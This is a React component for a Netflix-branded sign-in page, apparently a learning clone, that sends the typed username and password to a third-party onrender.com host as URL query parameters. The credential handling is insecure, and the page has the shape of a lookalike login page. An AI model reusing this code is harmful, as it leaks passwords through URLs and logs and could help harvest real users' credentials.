import { useState } from "react"
import axios from 'axios'
import {useNavigate}from'react-router-dom'
import logo from './assets/logo.svg'


function App() {
  const navigate=useNavigate()
  const[user,setuser]=useState("")
  const[pass,setpass]=useState("")
  function handleuser(){
setuser(event.target.value)
  }
  function handlepass(){
setpass(event.target.value)
  }
  function check(){
let logindetails=axios.get(`https://netflix-sign-in-page.onrender.com/login?username=${user}&password=${pass}`)
logindetails.then((data)=>{
  if(data.data==true){
    navigate("/success")
  }
  else{
    navigate("/fail")
    

  }
})
  }
  return(
<>
<div className="text">
<nav>
   <a href="#"><img src={logo} alt="" /></a>
</nav>
<div className="form-wrapper">
  <h2>Sign In</h2>
  <form action="#">
    <div className="form-control">
<input onChange={handleuser} name="username"placeholder="Email or Phone number"  type="text"required />++
<label htmlFor=""></label>
</div>
 <div className="form-control">
  <input onChange={handlepass} name="password"placeholder="password"  type="text" required />
<label htmlFor=""></label>
 </div>
    <button onClick={check}>Sign In</button>
    <div className="form-help">
      <div className="remember-me">
        <input type="checkbox"id="remember-me" />
        <label htmlFor="">remember me</label>
      </div>
      <a href="#">Need Help?</a>
    </div>
  </form>
  <p>New to Netflix? <a href="#">Sign up Now</a></p>
  <small>
    This page is protected by Google reCAPTCHA to ensure you're not a bot.
    <a href="#">Learn more.</a>
  </small>
</div>
</div>
</>
  )
}

export default App
